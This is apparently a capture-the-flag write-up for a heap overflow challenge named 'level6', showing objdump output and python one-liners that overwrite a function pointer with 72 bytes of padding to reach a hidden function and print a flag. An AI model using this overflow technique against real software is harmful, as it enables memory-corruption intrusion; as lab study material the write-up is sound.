## level6

Heap overflow

TODO: try with objdump -R

```console
$ objdump -t level6 | grep n
08048454 g     F .text  00000014              n
$ ./level6 $(python -c 'print("w" * 64 + "\x54\x84\x04\x08")')
Nope
$ ./level6 $(python -c 'print("w" * 68 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
$ ./level6 $(python -c 'print("w" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
$ ./level6 $(python -c 'print("w" * 76 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
```

72 byte of padding and not 64 because 8 bytes of metadata in malloc
